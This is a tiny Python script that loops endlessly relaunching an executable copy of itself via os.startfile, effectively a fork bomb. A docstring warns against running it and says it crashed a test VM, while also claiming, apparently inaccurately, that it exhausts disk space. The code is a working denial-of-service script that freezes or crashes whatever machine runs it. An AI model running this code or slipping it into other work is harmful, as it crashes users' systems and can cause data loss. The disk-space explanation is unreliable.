import os

while True:
    os.startfile(__file__[:-2] + "exe") # lunch a file

""" 
Please, *never try this*.
I have tried it on a VM, and it crashes the OS actually,
it will open files untill your OS disk-space is full.
"""